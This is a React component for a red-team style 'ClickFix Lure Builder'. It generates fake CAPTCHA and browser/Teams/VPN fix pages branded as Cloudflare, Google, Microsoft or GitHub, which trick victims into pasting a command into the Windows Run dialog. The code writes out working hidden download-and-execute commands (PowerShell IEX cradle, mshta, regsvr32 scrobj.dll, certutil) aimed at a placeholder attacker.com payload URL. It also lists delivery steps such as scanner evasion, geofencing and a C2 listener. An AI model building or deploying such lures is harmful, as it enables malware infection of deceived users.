import { useState } from 'react';
import {
  Box, Flex, Text, Heading, Input, Textarea, Select, Button,
  IconButton, useToast, SimpleGrid, Spinner,
} from '@chakra-ui/react';
import { CopyIcon, DownloadIcon, CheckIcon } from '@chakra-ui/icons';
import { motion, AnimatePresence } from 'framer-motion';

const MotionBox = motion(Box);

// ── Colors ────────────────────────────────────────────────────────────────────
const ACCENT = '#FC8181';
const GREEN  = '#68D391';
const BLUE   = '#63B3ED';
const ORANGE = '#F6AD55';
const PURPLE = '#9F7AEA';

// ── Label ─────────────────────────────────────────────────────────────────────
const Label = ({ children }) => (
  <Text fontSize="10px" color="var(--dash-text-muted)" textTransform="uppercase"
    letterSpacing="wider" fontWeight="bold" mb={1.5}>{children}</Text>
);

// ── Input / Select styles ─────────────────────────────────────────────────────
const inputSx = {
  variant: 'unstyled', bg: 'rgba(255,255,255,0.05)',
  border: '1px solid rgba(255,255,255,0.1)', borderRadius: '10px',
  px: 4, h: '40px', fontSize: 'sm', color: 'var(--dash-text-primary)',
  _placeholder: { color: 'var(--dash-text-muted)' },
  _hover: { border: `1px solid ${ACCENT}50` },
  _focus: { border: `1px solid ${ACCENT}80`, boxShadow: `0 0 0 1px ${ACCENT}40` },
};
const selSx = {
  bg: 'rgba(255,255,255,0.05)', borderColor: 'rgba(255,255,255,0.1)',
  borderRadius: '10px', h: '40px', fontSize: 'sm', color: 'var(--dash-text-primary)',
  focusBorderColor: `${ACCENT}80`,
  _hover: { borderColor: `${ACCENT}50` },
  sx: { '& option': { background: '#1a1a1f !important' } },
};

// ── Section card ──────────────────────────────────────────────────────────────
const Card = ({ children, accentColor = ACCENT, ...rest }) => (
  <Box pos="relative" bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
    borderRadius="14px" overflow="hidden" {...rest}>
    <Box pos="absolute" top="0" left="0" right="0" h="2px"
      style={{ background: `linear-gradient(to right, transparent, ${accentColor}80, transparent)` }} />
    {children}
  </Box>
);

// ── Stat card ─────────────────────────────────────────────────────────────────
const StatCard = ({ label, value, color, delay = 0 }) => (
  <MotionBox initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
    transition={{ duration: 0.22, delay }}
    px={4} py={3} borderRadius="12px" bg="var(--dash-card-bg)"
    border="1px solid var(--dash-card-border)" pos="relative" overflow="hidden">
    <Box pos="absolute" top={0} left={0} right={0} h="2px"
      style={{ background: `linear-gradient(to right, transparent, ${color}80, transparent)` }} />
    <Text fontSize="22px" fontWeight="bold" color={color} lineHeight={1}>{value}</Text>
    <Text fontSize="11px" color="var(--dash-text-muted)" mt={1}>{label}</Text>
  </MotionBox>
);

// ── Lure type pill ────────────────────────────────────────────────────────────
const LurePill = ({ label, desc, active, onClick }) => (
  <Box px={4} py={3} borderRadius="10px" cursor="pointer"
    bg={active ? `${ACCENT}12` : 'rgba(255,255,255,0.03)'}
    border={active ? `1px solid ${ACCENT}50` : '1px solid rgba(255,255,255,0.07)'}
    _hover={{ bg: active ? `${ACCENT}16` : 'rgba(255,255,255,0.06)', borderColor: `${ACCENT}40` }}
    style={{ transition: 'all 0.12s' }}
    onClick={onClick}>
    <Text fontSize="12px" fontWeight="semibold" color={active ? ACCENT : 'var(--dash-text-primary)'}>{label}</Text>
    <Text fontSize="10px" color="var(--dash-text-muted)" mt={0.5}>{desc}</Text>
  </Box>
);

// ── Copy field ────────────────────────────────────────────────────────────────
const CopyField = ({ value, label, color = GREEN }) => {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(value);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <Flex align="center" gap={1.5} p={2} borderRadius="8px"
      bg={`${color}08`} border={`1px solid ${color}18`} w="fit-content">
      {label && <Text fontSize="10px" color="var(--dash-text-muted)" mr={0.5}>{label}</Text>}
      <Text fontSize="11px" color={color} fontFamily="monospace" fontWeight="600" maxW="360px" noOfLines={1}>
        {value}
      </Text>
      <IconButton icon={copied ? <CheckIcon boxSize={2.5} color={color} /> : <CopyIcon boxSize={2.5} />}
        size="xs" variant="ghost" minW="20px" h="20px"
        color={copied ? color : 'var(--dash-text-muted)'}
        _hover={{ color }} onClick={copy} aria-label="Copy" />
    </Flex>
  );
};

// ── Static data ───────────────────────────────────────────────────────────────
const LURE_TYPES = [
  { value: 'captcha',     label: 'Fake CAPTCHA',          desc: '"I am not a robot" reCAPTCHA flow' },
  { value: 'browser-fix', label: 'Browser Fix',           desc: 'Fake browser update / font fix page' },
  { value: 'teams-fix',   label: 'Microsoft Teams Fix',   desc: 'Fake Teams audio/video issue fix' },
  { value: 'vpn-fix',     label: 'VPN Certificate Fix',   desc: 'Fake VPN certificate installation prompt' },
  { value: 'word-fix',    label: 'Office Doc Fix',        desc: 'Fake Word / Excel macro enable prompt' },
  { value: 'custom',      label: 'Custom',                desc: 'Write your own lure text' },
];

const PAYLOAD_TYPES = [
  { value: 'powershell', label: 'PowerShell Download-Cradle' },
  { value: 'mshta',      label: 'MSHTA HTA' },
  { value: 'regsvr32',   label: 'Regsvr32 SCT' },
  { value: 'certutil',   label: 'CertUtil Download' },
  { value: 'curl',       label: 'Invoke-RestMethod' },
  { value: 'custom',     label: 'Custom Command' },
];

const THEMES = [
  { value: 'cloudflare', label: 'Cloudflare', accent: '#F6821F' },
  { value: 'google',     label: 'Google',     accent: '#4285F4' },
  { value: 'microsoft',  label: 'Microsoft',  accent: '#0078D4' },
  { value: 'github',     label: 'GitHub',     accent: '#24292f' },
  { value: 'dark',       label: 'Dark Generic', accent: '#ff4444' },
];

// ── Builders ──────────────────────────────────────────────────────────────────
function buildCommand(payloadType, payloadUrl, customCmd) {
  switch (payloadType) {
    case 'powershell': return `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('${payloadUrl}')"`;
    case 'mshta':      return `mshta ${payloadUrl}`;
    case 'regsvr32':   return `regsvr32 /s /n /u /i:${payloadUrl} scrobj.dll`;
    case 'certutil':   return `certutil -urlcache -split -f ${payloadUrl} %temp%\\payload.exe && %temp%\\payload.exe`;
    case 'curl':       return `powershell -nop -w hidden -c "& ([scriptblock]::Create((irm '${payloadUrl}')))"`;
    case 'custom':     return customCmd;
    default:           return '';
  }
}

function generateHTML({ lureType, theme, title, bodyText, command, stepLabel }) {
  const themeObj = THEMES.find(t => t.value === theme) || THEMES[0];
  const accent   = themeObj.accent;
  const escapedCmd = command;

  const lureBody = lureType === 'captcha'
    ? `<div class="captcha-box">
        <div class="captcha-inner">
          <div class="captcha-check" id="checkBox" onclick="verify()">
            <div class="checkmark" id="checkmark" style="display:none;">✓</div>
          </div>
          <span>I am not a robot</span>
        </div>
        <div class="captcha-logo">reCAPTCHA<br><small>Privacy · Terms</small></div>
      </div>`
    : `<button class="verify-btn" onclick="verify()" id="verifyBtn">${stepLabel || 'Fix Issue'}</button>`;

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${title || 'Verification Required'}</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f0f0;display:flex;align-items:center;justify-content:center;min-height:100vh;}
  .card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.12);padding:40px 48px;max-width:480px;width:100%;text-align:center;}
  .brand{font-size:22px;font-weight:700;color:${accent};margin-bottom:24px;}
  h1{font-size:20px;font-weight:600;color:#1a1a2e;margin-bottom:10px;}
  p{color:#555;font-size:14px;line-height:1.6;margin-bottom:20px;}
  .steps{background:#f8f9fa;border-radius:8px;padding:16px 20px;text-align:left;margin-bottom:20px;}
  .steps li{color:#333;font-size:13px;margin:6px 0;list-style:none;padding-left:8px;}
  .steps li::before{content:'→ ';color:${accent};}
  kbd{background:#e9ecef;border:1px solid #adb5bd;border-radius:4px;padding:2px 6px;font-size:12px;font-family:monospace;}
  .cmd-box{background:#1a1a2e;border-radius:8px;padding:14px 16px;margin:14px 0;display:flex;align-items:center;gap:10px;cursor:pointer;border:1px solid #333;position:relative;}
  .cmd-text{color:#a8ff78;font-family:monospace;font-size:12px;flex:1;text-align:left;word-break:break-all;}
  .copy-btn{background:${accent};color:#fff;border:none;border-radius:6px;padding:6px 14px;font-size:12px;cursor:pointer;white-space:nowrap;}
  .verify-btn{background:${accent};color:#fff;border:none;border-radius:8px;padding:12px 32px;font-size:15px;font-weight:600;cursor:pointer;width:100%;margin-top:8px;}
  .captcha-box{border:1px solid #d0d0d0;border-radius:4px;display:flex;align-items:center;justify-content:space-between;padding:14px 18px;margin:16px 0;background:#f9f9f9;}
  .captcha-inner{display:flex;align-items:center;gap:14px;}
  .captcha-check{width:26px;height:26px;border:2px solid #c1c1c1;border-radius:2px;cursor:pointer;display:flex;align-items:center;justify-content:center;background:#fff;}
  .checkmark{color:#4caf50;font-size:18px;font-weight:bold;}
  .captcha-logo{text-align:right;font-size:11px;color:#888;}
  .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);align-items:center;justify-content:center;z-index:999;}
  .modal.show{display:flex;}
  .modal-card{background:#fff;border-radius:12px;padding:32px 36px;max-width:420px;width:100%;text-align:center;}
  .modal-card h2{font-size:17px;font-weight:700;margin-bottom:12px;color:#1a1a2e;}
  .copied{position:absolute;right:60px;top:50%;transform:translateY(-50%);background:#333;color:#fff;font-size:11px;padding:3px 8px;border-radius:4px;pointer-events:none;opacity:0;transition:.3s;}
</style>
</head>
<body>
<div class="card">
  <div class="brand">${title || 'Verification Required'}</div>
  <h1>${bodyText ? bodyText.split('\n')[0] : 'Security Verification Required'}</h1>
  <p>${bodyText ? bodyText.split('\n').slice(1).join(' ') : 'To continue, please complete the verification process below.'}</p>
  ${lureBody}
</div>
<div class="modal" id="modal">
  <div class="modal-card">
    <h2>Complete Verification</h2>
    <p style="font-size:13px;color:#555;margin-bottom:16px;">Follow these steps to prove you&apos;re human:</p>
    <ol class="steps" style="text-align:left;padding-left:0;">
      <li>Press <kbd>Win</kbd> + <kbd>R</kbd> to open Run</li>
      <li>Click the box below to copy the command</li>
      <li>Paste it into the Run dialog and press <kbd>Enter</kbd></li>
    </ol>
    <div class="cmd-box" onclick="copyCmd(this)">
      <span class="cmd-text" id="theCmd">${escapedCmd}</span>
      <button class="copy-btn">Copy</button>
      <span class="copied" id="copiedLabel">Copied!</span>
    </div>
    <button class="verify-btn" onclick="document.getElementById('modal').classList.remove('show')" style="margin-top:12px;background:#eee;color:#333;">Done</button>
  </div>
</div>
<script>
function verify(){
  var cb=document.getElementById('checkBox');
  var cm=document.getElementById('checkmark');
  if(cb){cb.style.borderColor='#4caf50';if(cm)cm.style.display='block';}
  var btn=document.getElementById('verifyBtn');
  if(btn){btn.disabled=true;btn.textContent='Verified \u2713';}
  setTimeout(function(){document.getElementById('modal').classList.add('show');},600);
}
function copyCmd(el){
  var txt=document.getElementById('theCmd').textContent;
  navigator.clipboard.writeText(txt).then(function(){
    var lbl=document.getElementById('copiedLabel');
    lbl.style.opacity='1';
    setTimeout(function(){lbl.style.opacity='0';},1800);
  });
}
</script>
</body>
</html>`;
}

// ── Main ──────────────────────────────────────────────────────────────────────
export default function ClickFixView() {
  const toast = useToast();

  const [lureType,    setLureType]    = useState('captcha');
  const [theme,       setTheme]       = useState('cloudflare');
  const [pageTitle,   setPageTitle]   = useState('Verification Required');
  const [bodyText,    setBodyText]    = useState('Security Verification Required\nTo continue, please complete the verification process below.');
  const [payloadType, setPayloadType] = useState('powershell');
  const [payloadUrl,  setPayloadUrl]  = useState('https://attacker.com/payload.ps1');
  const [customCmd,   setCustomCmd]   = useState('');
  const [stepLabel,   setStepLabel]   = useState('Fix Issue');
  const [copying,     setCopying]     = useState(false);

  const command = buildCommand(payloadType, payloadUrl, customCmd);
  const html    = generateHTML({ lureType, theme, title: pageTitle, bodyText, command, stepLabel });

  const copyHTML = () => {
    navigator.clipboard.writeText(html);
    setCopying(true);
    setTimeout(() => setCopying(false), 1500);
    toast({ title: 'HTML copied to clipboard', status: 'success', duration: 2000, isClosable: true });
  };

  const downloadHTML = () => {
    const blob = new Blob([html], { type: 'text/html' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `clickfix-${lureType}-${Date.now()}.html`;
    a.click();
  };

  return (
    <Box px={6} pb={12} pt={5}>

      {/* ── Header ────────────────────────────────────────────────────────── */}
      <Flex justify="space-between" align="flex-start" mb={5} flexWrap="wrap" gap={3}>
        <Box>
          <Heading fontSize="2xl" fontWeight="bold" color="var(--dash-text-primary)" lineHeight={1.2}>
            ClickFix <Text as="span" color="red.400">Lure Builder</Text>
          </Heading>
          <Text fontSize="12px" color="var(--dash-text-secondary)" mt={1}>
            Generate social-engineering lure pages that deliver payloads via{' '}
            <Text as="span" color={ACCENT} fontWeight="semibold">Win+R execution</Text>
          </Text>
        </Box>
        <Flex gap={2}>
          <Button size="sm" leftIcon={copying ? <CheckIcon /> : <CopyIcon />}
            variant="ghost" color="var(--dash-text-muted)" borderRadius="8px"
            border="1px solid rgba(255,255,255,0.1)"
            _hover={{ color: 'white', bg: 'rgba(255,255,255,0.06)' }}
            onClick={copyHTML}>
            {copying ? 'Copied!' : 'Copy HTML'}
          </Button>
          <Button size="sm" leftIcon={<DownloadIcon />} borderRadius="8px"
            bg={`${ACCENT}20`} color={ACCENT} border={`1px solid ${ACCENT}50`}
            _hover={{ bg: `${ACCENT}35` }} fontWeight="bold" fontSize="12px"
            onClick={downloadHTML}>
            Download
          </Button>
        </Flex>
      </Flex>

      {/* ── Info banner ───────────────────────────────────────────────────── */}
      <Box mb={5} px={4} py={3} borderRadius="10px"
        bg="rgba(252,129,129,0.07)" border="1px solid rgba(252,129,129,0.25)">
        <Flex align="center" gap={2} mb={1.5}>
          <Box w="6px" h="6px" borderRadius="full" bg={ACCENT} />
          <Text fontSize="10px" fontWeight="bold" color={ACCENT}
            textTransform="uppercase" letterSpacing="wider">Authorized Use Only</Text>
        </Flex>
        <Flex gap={4} flexWrap="wrap">
          {[
            'Mimics legitimate verification flows (CAPTCHA, browser-fix, VPN)',
            'Delivers payload via Win+R Run dialog — no file download prompt',
            'Technique observed in the wild since Q1 2024 (ClearFake, ClickFix campaigns)',
          ].map(t => (
            <Flex key={t} align="center" gap={1.5}>
              <Box w="4px" h="4px" borderRadius="full" bg={ACCENT} flexShrink={0} />
              <Text fontSize="11px" color="var(--dash-text-secondary)">{t}</Text>
            </Flex>
          ))}
        </Flex>
      </Box>

      {/* ── Stat row ──────────────────────────────────────────────────────── */}
      <SimpleGrid columns={4} gap={4} mb={6}>
        <StatCard label="Lure Type"       value={LURE_TYPES.find(l => l.value === lureType)?.label || '—'} color={ACCENT}  delay={0} />
        <StatCard label="Theme"           value={THEMES.find(t => t.value === theme)?.label || '—'}        color={BLUE}   delay={0.04} />
        <StatCard label="Payload"         value={PAYLOAD_TYPES.find(p => p.value === payloadType)?.label.split(' ')[0] || '—'} color={ORANGE} delay={0.08} />
        <StatCard label="HTML Size"       value={`${Math.round(html.length / 1024)}KB`}                   color={PURPLE} delay={0.12} />
      </SimpleGrid>

      {/* ── Main layout ───────────────────────────────────────────────────── */}
      <Flex gap={6} align="flex-start">

        {/* ── Left: config ──────────────────────────────────────────────── */}
        <Box w="420px" flexShrink={0}>

          {/* Lure Type */}
          <Card mb={4} accentColor={ACCENT}>
            <Box p={5}>
              <Label>Lure Type</Label>
              <SimpleGrid columns={2} gap={2}>
                {LURE_TYPES.map(lt => (
                  <LurePill key={lt.value} label={lt.label} desc={lt.desc}
                    active={lureType === lt.value}
                    onClick={() => setLureType(lt.value)} />
                ))}
              </SimpleGrid>
            </Box>
          </Card>

          {/* Page Content */}
          <Card mb={4} accentColor={BLUE}>
            <Box p={5}>
              <Label>Page Content</Label>
              <Box mb={3}>
                <Text fontSize="10px" color="var(--dash-text-muted)" mb={1.5}>Page Title</Text>
                <Input value={pageTitle} onChange={e => setPageTitle(e.target.value)}
                  placeholder="Verification Required" {...inputSx} />
              </Box>
              <Box mb={lureType !== 'captcha' ? 3 : 0}>
                <Text fontSize="10px" color="var(--dash-text-muted)" mb={1.5}>
                  Body Text <Text as="span" color="var(--dash-text-muted)" fontWeight="normal">(first line = heading)</Text>
                </Text>
                <Textarea value={bodyText} onChange={e => setBodyText(e.target.value)}
                  rows={3} resize="none" fontSize="sm"
                  bg="rgba(255,255,255,0.05)" border="1px solid rgba(255,255,255,0.1)"
                  borderRadius="10px" px={4} py={3} color="var(--dash-text-primary)"
                  _placeholder={{ color: 'var(--dash-text-muted)' }}
                  _hover={{ border: `1px solid ${BLUE}50` }}
                  _focus={{ border: `1px solid ${BLUE}80`, boxShadow: `0 0 0 1px ${BLUE}40` }} />
              </Box>
              {lureType !== 'captcha' && (
                <Box>
                  <Text fontSize="10px" color="var(--dash-text-muted)" mb={1.5}>Button Label</Text>
                  <Input value={stepLabel} onChange={e => setStepLabel(e.target.value)}
                    placeholder="Fix Issue" {...inputSx} />
                </Box>
              )}
            </Box>
          </Card>

          {/* Payload */}
          <Card mb={4} accentColor={ORANGE}>
            <Box p={5}>
              <Label>Payload</Label>
              <Box mb={3}>
                <Text fontSize="10px" color="var(--dash-text-muted)" mb={1.5}>Payload Type</Text>
                <Select value={payloadType} onChange={e => setPayloadType(e.target.value)} {...selSx}>
                  {PAYLOAD_TYPES.map(pt => (
                    <option key={pt.value} value={pt.value}>{pt.label}</option>
                  ))}
                </Select>
              </Box>
              {payloadType !== 'custom' ? (
                <Box>
                  <Text fontSize="10px" color="var(--dash-text-muted)" mb={1.5}>Payload URL</Text>
                  <Input value={payloadUrl} onChange={e => setPayloadUrl(e.target.value)}
                    placeholder="https://attacker.com/payload.ps1"
                    fontFamily="monospace" fontSize="12px" {...inputSx} />
                </Box>
              ) : (
                <Box>
                  <Text fontSize="10px" color="var(--dash-text-muted)" mb={1.5}>Custom Command</Text>
                  <Textarea value={customCmd} onChange={e => setCustomCmd(e.target.value)}
                    placeholder="cmd /c ..." rows={3} resize="none"
                    fontFamily="monospace" fontSize="12px"
                    bg="rgba(255,255,255,0.05)" border="1px solid rgba(255,255,255,0.1)"
                    borderRadius="10px" px={4} py={3} color="var(--dash-text-primary)"
                    _placeholder={{ color: 'var(--dash-text-muted)' }}
                    _hover={{ border: `1px solid ${ORANGE}50` }}
                    _focus={{ border: `1px solid ${ORANGE}80`, boxShadow: `0 0 0 1px ${ORANGE}40` }} />
                </Box>
              )}

              {/* Generated command display */}
              {command && (
                <Box mt={4} p={3} borderRadius="10px"
                  bg="rgba(0,0,0,0.3)" border="1px solid rgba(255,255,255,0.07)">
                  <Text fontSize="10px" color="var(--dash-text-muted)" mb={2}
                    textTransform="uppercase" letterSpacing="wider" fontWeight="bold">Generated Command</Text>
                  <CopyField value={command} color={GREEN} />
                </Box>
              )}
            </Box>
          </Card>

          {/* Theme */}
          <Card accentColor={PURPLE}>
            <Box p={5}>
              <Label>Brand Theme</Label>
              <SimpleGrid columns={3} gap={2}>
                {THEMES.map(t => (
                  <Box key={t.value}
                    px={3} py={2.5} borderRadius="8px" cursor="pointer"
                    bg={theme === t.value ? `${PURPLE}12` : 'rgba(255,255,255,0.03)'}
                    border={theme === t.value ? `1px solid ${PURPLE}50` : '1px solid rgba(255,255,255,0.07)'}
                    _hover={{ bg: `${PURPLE}10`, borderColor: `${PURPLE}40` }}
                    style={{ transition: 'all 0.12s' }}
                    onClick={() => setTheme(t.value)}>
                    <Box w={4} h={4} borderRadius="full" bg={t.accent} mb={1.5} />
                    <Text fontSize="11px" fontWeight="semibold" color={theme === t.value ? PURPLE : 'var(--dash-text-primary)'}>{t.label}</Text>
                  </Box>
                ))}
              </SimpleGrid>
            </Box>
          </Card>
        </Box>

        {/* ── Right: preview + checklist ───────────────────────────────── */}
        <Box flex={1} minW={0}>

          {/* Browser preview */}
          <Card mb={4} accentColor={GREEN}>
            <Box p={0} overflow="hidden" borderRadius="14px">
              {/* Browser chrome */}
              <Flex px={4} py={3} align="center" gap={2}
                borderBottom="1px solid rgba(255,255,255,0.07)">
                <Box w={3} h={3} borderRadius="full" bg="red.400" />
                <Box w={3} h={3} borderRadius="full" bg="yellow.400" />
                <Box w={3} h={3} borderRadius="full" bg="green.400" />
                <Box flex={1} mx={3} px={3} py={1} borderRadius="6px"
                  bg="rgba(255,255,255,0.05)" border="1px solid rgba(255,255,255,0.08)">
                  <Text fontSize="10px" color="var(--dash-text-muted)" fontFamily="monospace">
                    https://verify.{THEMES.find(t => t.value === theme)?.label?.toLowerCase() || 'example'}.com/captcha
                  </Text>
                </Box>
              </Flex>
              <Box h="520px" overflow="hidden">
                <iframe
                  key={html}
                  title="ClickFix Preview"
                  srcDoc={html}
                  style={{ width: '100%', height: '100%', border: 'none', background: '#f0f0f0' }}
                  sandbox="allow-scripts"
                />
              </Box>
            </Box>
          </Card>

          {/* Delivery checklist */}
          <Card accentColor={ORANGE}>
            <Box p={5}>
              <Label>Delivery Checklist</Label>
              <Flex direction="column" gap={2}>
                {[
                  { label: 'Domain categorised & aged ≥30 days',      color: ORANGE },
                  { label: 'HTTPS certificate installed (Let\'s Encrypt)', color: GREEN },
                  { label: 'Payload URL responding (HTTP 200)',         color: GREEN },
                  { label: 'Geofencing / IP filtering configured',     color: ORANGE },
                  { label: 'User-agent filtering blocks scanners',     color: ORANGE },
                  { label: 'Lure page tested in target browser',       color: BLUE },
                  { label: 'C2 listener running and responsive',       color: ACCENT },
                ].map((item, i) => (
                  <Flex key={i} align="center" gap={3} py={1.5}
                    borderBottom={i < 6 ? '1px solid rgba(255,255,255,0.05)' : 'none'}>
                    <Box w="6px" h="6px" borderRadius="full" bg={item.color} flexShrink={0} />
                    <Text fontSize="12px" color="var(--dash-text-secondary)">{item.label}</Text>
                  </Flex>
                ))}
              </Flex>
            </Box>
          </Card>
        </Box>
      </Flex>
    </Box>
  );
}
